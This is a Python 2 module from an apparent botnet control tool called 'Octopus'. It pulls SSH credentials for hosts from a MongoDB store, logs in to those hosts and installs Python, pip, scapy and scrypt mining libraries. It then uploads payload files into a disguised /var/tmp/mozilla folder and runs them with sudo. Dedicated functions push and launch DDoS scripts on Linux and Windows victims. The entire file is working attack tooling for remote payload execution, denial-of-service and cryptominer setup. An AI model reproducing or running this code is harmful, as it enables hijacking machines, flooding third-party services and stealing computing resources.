# -*- coding: utf-8 -*

#############################################################################
#	Copyright (C) 2018  Javier Mínguez @JaviMrSec							#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################

from pymongo import MongoClient
import paramiko, time, socket, sys, os

client = MongoClient()
db = client.Octopus


class colors:
	HEADER = '\033[93m'
	FAIL = '\033[91m'
	SUCCES = '\033[92m'
	REGULAR = '\033[0m'
	BLUE = '\033[94m'


def python_install(host):
	paramiko.util.log_to_file("ssh_python_install.log")
	info_dic = {}
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']

		print colors.HEADER + "|----[INFO] Connecting to "+host+" with user: "+ssh_user+", password: " + ssh_pass + colors.REGULAR
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)
		except:
			print colors.FAIL + "[ERROR] Can not connect to "+ host + " with "+ssh_user+"/"+ssh_pass + colors.REGULAR
			return False
		channel = ssh.invoke_shell()
		time.sleep(1)
		channel.recv(9999)
		channel.send("\n")
		time.sleep(1)

		#|-------------CHECK LANGUAGE-------------|
		channel.send("cat /etc/default/locale" + "\n")
		time.sleep(0.1)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		if 'es_' in output.decode('utf-8'):
			lang = 'es'
			info_dic['lang'] = 'es'
		elif 'en_' in output.decode('utf-8'):
			lang = 'en'
			info_dic['lang'] = 'en'
		else:
			channel.close()
			ssh.close()
			sys.close()
			info_dic['lang'] = 'other'
			raise Exception('Can not determinate language')

		#|-------------PYTHON INSTALLATION-------------|
		channel.send("sudo apt install python" + "\n")
		time.sleep(0.1)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		channel.send(ssh_pass + "\n")
		time.sleep(2)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		if lang == 'es':
			channel.send("S" + "\n")
		elif lang == 'en':
			channel.send("Y" + "\n")
		time.sleep(5)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		time.sleep(3)
		info_dic['python'] = 'YES'
		channel.close()
		ssh.close()
		try:
			db.hosts.update({"host":host},{"$set":{"info.lang":info_dic['lang'], "info.python":info_dic['python']}})
			print colors.SUCCES + "[DB] Data inserted in database" + colors.REGULAR
			return True
		except:
			print colors.FAIL + "[ERROR] Error inserting data in database" + colors.REGULAR
			return False
	except:
		channel.close()
		ssh.close()
		print colors.FAIL + "[ERROR] Error while python installation" + colors.REGULAR
		return False

def ssh_run_payload(host, files):
	paramiko.util.log_to_file("ssh_run_commands.log")
	info_dic = {}
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)
		channel = ssh.invoke_shell()
		for file in files:
			try:
				print "sudo bash -c 'python /var/tmp/mozilla/"+file
				channel.send("sudo bash -c 'python /var/tmp/mozilla/"+file + " &'\n")
				time.sleep(1)
				output = channel.recv(99999)
				print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
				channel.send(ssh_pass + "\n")
				time.sleep(2)
				output = channel.recv(99999)
				print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR

			except Exception, error:
				print error
				print colors.FAIL + "[ERROR] Error while executing " + file + colors.REGULAR
				return False
		ssh.close()
		return True
	except:
		ssh.close()
		print colors.FAIL + "[ERROR] Error while executing payloads" + colors.REGULAR
		return False

def ssh_load_files(host, loadfiles, user_files, default_files):
	paramiko.util.log_to_file("ssh_load_files.log")

	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] The host " + host + " can not be finded in database" + colors.REGULAR
		return False
	try:
		if query['info']['python'] != 'YES':
			python_install(host)

		print colors.HEADER + "|----[INFO] Connecting to "+host+" with user: "+ssh_user+", password: " + ssh_pass + colors.REGULAR
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)

		channel = ssh.invoke_shell()
		time.sleep(1)
		channel.recv(9999)
		channel.send("\n")
		time.sleep(1)

		#|-------------CREATE DIR-------------|
		commands=['sudo mkdir -m 777 -p /var/tmp/mozilla', ssh_pass]
		for command in commands:
			channel.send(command + "\n")
			while not channel.recv_ready(): #Wait for the server to read and respond
				time.sleep(1)
			time.sleep(1) #wait enough for writing to (hopefully) be finished
			output = channel.recv(9999) #read in
			print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
			time.sleep(2)

		#|-------------LOAD FILES-------------|
		if user_files:
			sftp = ssh.open_sftp()
			folder = 'static/files/'
			for file in loadfiles:
				try:
					sftp.stat('/var/tmp/mozilla/'+file)
					sftp.remove('/var/tmp/mozilla/'+file)
					file_upload = sftp.put(folder+file, '/var/tmp/mozilla/'+file)
				except IOError:
					file_upload = sftp.put(folder+file, '/var/tmp/mozilla/'+file)
				sftp.chmod('/var/tmp/mozilla/'+file, 777)
			print colors.HEADER + "[INFO] Charge done" + colors.REGULAR

		sftp.close()
		channel.close()
		ssh.close()
		return True
	except paramiko.AuthenticationException, error:
		print colors.FAIL + "[ERROR] incorrect password... "+ colors.REGULAR
		channel.close()
		ssh.close()
		return False
	except socket.error, error:
		print error
		print colors.FAIL +"|----[ERROR] with "+ ssh_user + "/"+ ssh_pass + ": " + colors.REGULAR
		channel.close()
		ssh.close()
		return False
	except paramiko.SSHException, error:
		print error
		print colors.FAIL + "|----[ERROR]Most probably this is caused by a missing host key" + colors.REGULAR
		channel.close()
		ssh.close()
		return False
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] An unknown error was detected" + colors.REGULAR
		channel.close()
		ssh.close()
		return False


def ssh_windows_load(host, loadfiles, user_files, default_files):
	paramiko.util.log_to_file("ssh_windows_load.log")

	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']
	except Exception, error:
		print colors.FAIL + "[ERROR] The host " + host + " can not be finded in database" + colors.REGULAR
	try:
		print colors.HEADER + "|----[INFO] Connecting to "+host+" with user: "+ssh_user+", password: " + ssh_pass + colors.REGULAR
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)

		input, out, error = ssh.exec_command("MD cache")
		print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR

		print colors.HEADER + "|----[INFO] Directory created successfully "+ colors.REGULAR

		#|-------------LOAD FILES-------------|

		if user_files:
			sftp = ssh.open_sftp()
			folder = 'static/files/'
			for file in loadfiles:
				input, out, error = ssh.exec_command("rd cache\\"+file)
				try:
					sftp.stat("cache\\"+file)
					sftp.remove("cache\\"+file)
					file_upload = sftp.put(folder+file,"cache\\"+file)
				except IOError:
					file_upload = sftp.put(folder+file,"cache\\"+file)

		print colors.HEADER + "|----[INFO] LOAD SUCCESS "  + colors.REGULAR
		ssh.close()
	except paramiko.AuthenticationException, error:
		print colors.FAIL + "[ERROR] incorrect password... "+ colors.REGULAR
		ssh.close()
	except socket.error, error:
		print error
		print colors.FAIL +"|----[ERROR] with "+ ssh_user + "/"+ ssh_pass + ": " + colors.REGULAR
		ssh.close()
	except paramiko.SSHException, error:
		print error
		print colors.FAIL + "|----[ERROR]Most probably this is caused by a missing host key" + colors.REGULAR
		ssh.close()
	except Exception, error:
		print error
		print colors.FAIL + "[ERROR] CANNOT COMPLETE THE LOAD PROCESS" + colors.REGULAR
		ssh.close()


def ssh_run_windows(host, files):
	paramiko.util.log_to_file("ssh_run_windows.log")
	info_dic = {}
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)

		for file in files:
			try:
				comm = '""C:\\Python36\python.exe cache\""'
				input, out, error = ssh.exec_command(comm+file)
				print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR

			except Exception, error:
				print error
				print colors.FAIL + "[ERROR] Error while executing " + file + colors.REGULAR
				return False
		ssh.close()
		return True
	except:
		ssh.close()
		print colors.FAIL + "[ERROR] Error while executing payloads" + colors.REGULAR
		return False


def run_ddos_linux(host, ddos_script):
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)
		channel = ssh.invoke_shell()


		#|-------------CREATE DIR-------------|
		try:
			commands=['sudo mkdir -m 777 -p /var/tmp/mozilla', ssh_pass]
			for command in commands:
				channel.send(command + "\n")
				while not channel.recv_ready(): #Wait for the server to read and respond
					time.sleep(1)
				time.sleep(1) #wait enough for writing to (hopefully) be finished
				output = channel.recv(9999) #read in
				print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
				time.sleep(2)
				print colors.HEADER + "|----[INFO] Directory created successfully "+ colors.REGULAR
		except Exception, error:
			print error
			print colors.FAIL + "[ERROR] Error while creating directory " + file + colors.REGULAR
			return False

		#|-------------LOAD SCRIPT-------------|
		sftp = ssh.open_sftp()
		folder = "static/ddos/"

		try:
			sftp.stat('/var/tmp/mozilla/'+ddos_script)
			sftp.remove('/var/tmp/mozilla/'+ddos_script)
			file_upload = sftp.put(folder+ddos_script, '/var/tmp/mozilla/'+ddos_script)
		except IOError:
			file_upload = sftp.put(folder+ddos_script, '/var/tmp/mozilla/'+ddos_script)
		sftp.chmod('/var/tmp/mozilla/'+ddos_script, 777)

		#|-------------RUN SCRIPT-------------|
		try:
			channel.send("sudo bash -c 'python /var/tmp/mozilla/"+ddos_script + " &'\n")
			time.sleep(1)
			output = channel.recv(9999)
			print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
			channel.send(ssh_pass)
			output = channel.recv(9999)
			print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR

		except Exception, error:
			print error
			print colors.FAIL + "[ERROR] Error while executing " + ddos_script + colors.REGULAR
			return False

		channel.close()
		ssh.close()
		return True
	except:
		ssh.close()
		print colors.FAIL + "[ERROR] Error while executing payloads" + colors.REGULAR
		return False



def run_ddos_windows(host, ddos_script):
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)


		input, out, error = ssh.exec_command("MD cache")
		print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR

		print colors.HEADER + "|----[INFO] Directory created successfully "+ colors.REGULAR

		#|-------------LOAD SCRIPT-------------|
		sftp = ssh.open_sftp()
		folder = "static/ddos/"
		input, out, error = ssh.exec_command("rd cache\\"+ddos_script)
		try:
			sftp.stat("cache\\"+ddos_script)
			sftp.remove("cache\\"+ddos_script)
			file_upload = sftp.put(folder+ddos_script,"cache\\"+ddos_script)
		except IOError:
			file_upload = sftp.put(folder+ddos_script,"cache\\"+ddos_script)

		#|-------------RUN SCRIPT-------------|
		try:
			comm = '""C:\\Python36\python.exe cache\""'
			input, out, error = ssh.exec_command(comm+ddos_script)
			print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR

		except Exception, error:
			print error
			print colors.FAIL + "[ERROR] Error while executing " + ddos_script + colors.REGULAR
			return False

		ssh.close()
		return True
	except:
		ssh.close()
		print colors.FAIL + "[ERROR] Error while executing payloads" + colors.REGULAR
		return False


def pip_install(host, ssh_user, ssh_pass, lang):
	info_dic = {}
	try:
		print colors.HEADER + "|----[INFO] Connecting to "+host+" with user: "+ssh_user+", password: " + ssh_pass + colors.REGULAR
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)
		except:
			print colors.FAIL + "[ERROR] Can not connect to "+ host + " with "+ssh_user+"/"+ssh_pass + colors.REGULAR
			return False
		channel = ssh.invoke_shell()
		time.sleep(1)
		channel.recv(9999)
		channel.send("\n")
		time.sleep(1)

		channel.send("sudo apt install python-pip" + "\n")
		time.sleep(0.2)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		channel.send(ssh_pass + "\n")
		time.sleep(2)
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		if lang == 'es':
			channel.send("S" + "\n")
		elif lang == 'en':
			channel.send("Y" + "\n")
		output = channel.recv(9999)
		print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		time.sleep(3)

		#|-------------INSERT IN DB-------------|
		query = db.hosts.find_one({"host":host})
		query['info']['pip'] = "YES"
		db.hosts.delete_one({"_id":query['_id']})
		db.hosts.insert(query)


		channel.close()
		ssh.close()

	except:
		channel.close()
		ssh.close()
		print colors.FAIL + "[ERROR] Error while python installation" + colors.REGULAR
		return False

def scapy_install(host, ssh_user, ssh_pass, os):
	info_dic = {}
	try:
		print colors.HEADER + "|----[INFO] Connecting to "+host+" with user: "+ssh_user+", password: " + ssh_pass + colors.REGULAR
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)
		except:
			print colors.FAIL + "[ERROR] Can not connect to "+ host + " with "+ssh_user+"/"+ssh_pass + colors.REGULAR
			return False
		if os == 'Linux':
			channel = ssh.invoke_shell()
			time.sleep(1)
			channel.recv(9999)
			channel.send("\n")
			time.sleep(1)

			channel.send("sudo pip install scapy" + "\n")
			time.sleep(0.2)
			output = channel.recv(9999)
			print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
			channel.send(ssh_pass + "\n")
			time.sleep(2)
			output = channel.recv(9999)
			print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
		elif os == 'Windows':
			try:
				comm = 'pip install scapy'
				input, out, error = ssh.exec_command(comm+ddos_script)
				print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR

			except Exception, error:
				print error
				print colors.FAIL + "[ERROR] Error while executing " + ddos_script + colors.REGULAR
				return False

		#|-------------INSERT IN DB-------------|
		query = db.hosts.find_one({"host":host})
		query['info']['scapy'] = "YES"
		db.hosts.delete_one({"_id":query['_id']})
		db.hosts.insert(query)


		channel.close()
		ssh.close()

	except:
		channel.close()
		ssh.close()
		print colors.FAIL + "[ERROR] Error while python installation" + colors.REGULAR
		return False


def cryto_dependences_install(host):
	try:
		query = db.hosts.find_one({"host":host})
		ssh_user = query['credentials']['ssh_user']
		ssh_pass = query['credentials']['ssh_pass']
		lang = query['info']['lang']
		os = query['info']['os']

		if os == 'Linux':
			if 'pip' in query['info'].keys():
				if query['info']['pip']=='YES':
					pass
				else:
					pip_install(host, ssh_user, ssh_pass, lang)
			else:
				pip_install(host, ssh_user, ssh_pass, lang)

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(host, 22, username=ssh_user, password=ssh_pass, timeout=10)

		if os == 'Linux':

			channel = ssh.invoke_shell()
			commands = ['sudo pip install scrypt', 'sudo pip install ltc_scrypt']
			for c in commands:
				try:
					channel.send(c+ "\n")
					time.sleep(1)
					output = channel.recv(99999)
					print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
					channel.send(ssh_pass+ "\n")
					time.sleep(2)
					output = channel.recv(99999)
					print colors.BLUE + "[BOT SSH SHELL] " + output.decode('utf-8') + colors.REGULAR
					time.sleep(5)

				except Exception, error:
					print error
					print colors.FAIL + "[ERROR] Error while installing crypto dependences " + colors.REGULAR
					return False
		elif os == 'Windows':
			try:
				commands = ['pip install scrypt', 'pip install ltc_scrypt']
				for c in commands:
					input, out, error = ssh.exec_command(c)
					print colors.BLUE + "[BOT SSH SHELL] " + out.read().decode('utf-8') +'/' +error.read().decode('utf-8') +colors.REGULAR
					time.sleep(5)

			except Exception, error:
				print error
				print colors.FAIL + "[ERROR] Error while executing " + ddos_script + colors.REGULAR
				return False
		ssh.close()

		#|-------------INSERT IN DB-------------|
		query = db.hosts.find_one({"host":host})
		query['info']['crypto_dependences'] = "YES"
		db.hosts.delete_one({"_id":query['_id']})
		db.hosts.insert(query)

		return True
	except:
		ssh.close()
		print colors.FAIL + "[ERROR] Error while executing payloads" + colors.REGULAR
		return False
